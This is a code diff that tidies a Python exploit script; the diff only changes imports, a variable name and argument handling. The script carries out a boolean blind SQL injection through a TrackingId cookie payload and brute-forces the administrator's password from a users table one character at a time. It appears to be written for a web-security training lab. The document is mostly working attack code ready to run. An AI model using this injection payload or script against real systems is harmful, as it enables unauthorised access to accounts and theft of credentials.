@@ -1,5 +1,11 @@
+import sys
+import signal
+import time
+import string
+import re
+import requests
+
 from pwn import *
-import requests, signal, time, pdb, sys, string, json,re
 from requests.exceptions import HTTPError,MissingSchema
 
 def def_handler(sig,frame):
@@ -26,7 +32,7 @@ def getTrackingSession(main_url):
         p0.failure(str(err))
         return False
 
-    return [trackingID, session];
+    return [trackingID, session]
 
 def sizePassword(main_url,tracking_id,session):
     p0=log.progress("Password Size")
@@ -46,9 +52,7 @@ def sizePassword(main_url,tracking_id,session):
 
     return it
 
-    
-
-def makeRequest(main_url,tracking_id,session,size):
+def makeRequest(main_url,tracking_id,session,ps):
     characters = string.ascii_lowercase + string.digits
     password=""
     p1= log.progress("Brute Force")
@@ -57,7 +61,7 @@ def makeRequest(main_url,tracking_id,session,size):
 
     p2=log.progress("Password")
 
-    for position in range(1,size):
+    for position in range(1,ps):
         for character in characters:
             cookies = {
                 'TrackingId': F"{tracking_id}' and (select substring(password,{position},1) from users where username = 'administrator')='{character}",
@@ -77,11 +81,11 @@ def makeRequest(main_url,tracking_id,session,size):
 
 if __name__ == '__main__':
     if len(sys.argv) != 2:
-        print("[+] Usage: %s <url>" % sys.argv[0])
-        print("[+] Example: %s www.example.com" % sys.argv[0])
-
-    url = sys.argv[1]
-    lResp = getTrackingSession(url)
-    if lResp is not False:
-        n= sizePassword(url, lResp[0],lResp[1])
-        makeRequest(url, lResp[0],lResp[1],n)
+        print(F"[+] Usage: {sys.argv[0]} <url>")
+        print(F"[+] Example: {sys.argv[0]} www.example.com")
+    else:
+        url = sys.argv[1]
+        lResp = getTrackingSession(url)
+        if lResp is not False:
+            ps = sizePassword(url, lResp[0],lResp[1])
+            makeRequest(url, lResp[0],lResp[1],ps)
